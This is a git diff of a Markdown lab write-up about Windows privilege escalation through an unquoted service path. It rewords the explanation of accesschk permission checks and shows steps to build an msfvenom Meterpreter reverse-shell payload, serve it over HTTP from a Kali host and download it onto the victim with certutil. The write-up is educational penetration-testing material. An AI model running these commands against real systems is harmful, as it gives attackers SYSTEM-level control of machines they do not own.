@@ -147,8 +147,9 @@ The output confirmed two important things:
 The `BINARY_PATH_NAME` contains spaces and is not enclosed in quotation marks, which makes it vulnerable to an **Unquoted Service Path** attack.
 The service runs as **LocalSystem**, so if I successfully exploit it, I can get **SYSTEM** privileges.
 
-
 ## Checked Write Permissions on C:\
+
+The service path starts from `C:\`, so I first checked whether I had write permission there.
 
 ```bash
 C:\PrivEsc>.\accesschk /accepteula -uwdq C:\
@@ -162,7 +163,7 @@ C:\
   RW BUILTIN\Administrators
   RW NT AUTHORITY\SYSTEM
 ```
-No write access for normal users on `C:\` — I needed to check deeper.
+The output showed that only **Administrators** and **SYSTEM** had write access to `C:\`. Since my user didn't have permission to write there, I needed to check the next folder in the service path.
 
 <p align="center">
   <img src="images/step1-2.png" width="600">
@@ -170,9 +171,9 @@ No write access for normal users on `C:\` — I needed to check deeper.
 
 ## Step 2 — Finding a Writable Folder in the Path
 
-I checked each folder in the service path one by one.
+Next, I checked each folder in the service path to see if I had write permission.
 
-Check `C:\Program Files\`
+### Check `C:\Program Files\`
 
 ```bash
 C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\"
@@ -187,13 +188,15 @@ C:\Program Files
   RW NT AUTHORITY\SYSTEM
   RW BUILTIN\Administrators
 ```
-No write access for normal users here either.
+The output showed that only **TrustedInstaller**, **SYSTEM**, and **Administrators** had write permission. My user could not write to this folder.
 
 <p align="center">
   <img src="images/step2-1.png" width="600">
 </p>
 
-Check `C:\Program Files\Unquoted Path Service\`
+### Check `C:\Program Files\Unquoted Path Service\`
+
+Since I couldn't write to the previous folder, I checked the next folder in the service path.
 
 ```bash
 C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
@@ -209,16 +212,17 @@ C:\Program Files\Unquoted Path Service
   RW NT AUTHORITY\SYSTEM
   RW BUILTIN\Administrators
 ```
-`RW BUILTIN\Users` — any normal user on the machine can write to this folder. That is exactly what I needed.
+This time, I found `RW BUILTIN\Users`, which means any normal user can write to this folder. This was exactly what I was looking for, because it gave me a place where I could put my malicious executable.
 
 ### Step 3 — Generating a New Payload and Downloading it to the Victim
 
-Generated Payload on Kali
+### Generated Payload on Kali
+
+After finding a writable folder, I created a new Meterpreter payload using msfvenom.
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o rev.exe
 ``` 
-
 **Output:**
 
 ```
@@ -229,12 +233,13 @@ Payload size: 510 bytes
 Final size of exe file: 7680 bytes
 Saved as: rev.exe
 ```
+This created a payload named `rev.exe`.
 
 <p align="center">
   <img src="images/step3-1.png" width="600">
 </p>
 
-Started Python HTTP Server on Kali
+### Started Python HTTP Server on Kali
 
 ```bash
 python3 -m http.server 80
@@ -247,7 +252,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.5.144 - - [20/Jun/2026 22:51:35] "GET / HTTP/1.1" 200 -
 ```
 
-Downloaded the Payload on the Victim Machine
+### Downloaded the Payload on the Victim Machine
 
 ```bash
 certutil -urlcache -split -f http://192.168.5.128/rev.exe rev.exe
